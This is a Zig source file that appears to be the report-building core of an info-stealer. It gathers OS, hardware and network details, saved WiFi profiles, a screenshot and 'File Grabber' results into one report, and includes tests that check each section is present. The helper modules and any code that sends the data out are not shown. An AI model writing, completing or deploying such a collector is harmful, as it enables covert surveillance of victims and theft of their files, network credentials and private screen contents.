const std = @import("std");
const os_info = @import("os_info.zig");
const hardware = @import("hardware.zig");
const network_info = @import("network_info.zig");
const wifi = @import("wifi.zig");
const screenshot = @import("screenshot.zig");
const grabber = @import("grabber.zig");

pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
    var report = std.ArrayList(u8).init(allocator);
    errdefer report.deinit();
    const w = report.writer();

    try w.print("=== OS Information ===\n", .{});
    {
        const os = os_info.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to collect OS info: {}\n", .{e});
        };
        defer allocator.free(os);
        try w.print("{s}\n\n", .{os});
    }

    try w.print("=== Hardware ===\n", .{});
    {
        const hw = hardware.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to collect hardware info: {}\n", .{e});
        };
        defer allocator.free(hw);
        try w.print("{s}\n\n", .{hw});
    }

    try w.print("=== Network ===\n", .{});
    {
        const net = network_info.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to collect network info: {}\n", .{e});
        };
        defer allocator.free(net);
        try w.print("{s}\n\n", .{net});
    }

    try w.print("=== WiFi Profiles ===\n", .{});
    {
        const wf = wifi.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to collect WiFi: {}\n", .{e});
        };
        defer allocator.free(wf);
        try w.print("{s}\n\n", .{wf});
    }

    try w.print("=== Screenshot ===\n", .{});
    {
        const ss = screenshot.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to capture screenshot: {}\n", .{e});
        };
        defer allocator.free(ss);
        try w.print("[Screenshot captured: {} bytes]\n\n", .{ss.len});
    }

    try w.print("=== File Grabber Results ===\n", .{});
    {
        const gr = grabber.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to grab files: {}\n", .{e});
        };
        defer allocator.free(gr);
        try w.print("{s}\n", .{gr});
    }

    return try report.toOwnedSlice();
}

const testing = std.testing;

test "collect returns complete report" {
    const report = try collect(testing.allocator);
    defer testing.allocator.free(report);
    try testing.expect(report.len > 0);
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "OS Information"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "Hardware"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "Network"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "WiFi"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "Screenshot"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "File Grabber"));
}

test "section_header style is correct" {
    var buf = std.ArrayList(u8).init(testing.allocator);
    defer buf.deinit();
    const w = buf.writer();
    try w.print("=== {s} ===\n", .{"Test"});
    try testing.expectEqualStrings("=== Test ===\n", buf.items);
}
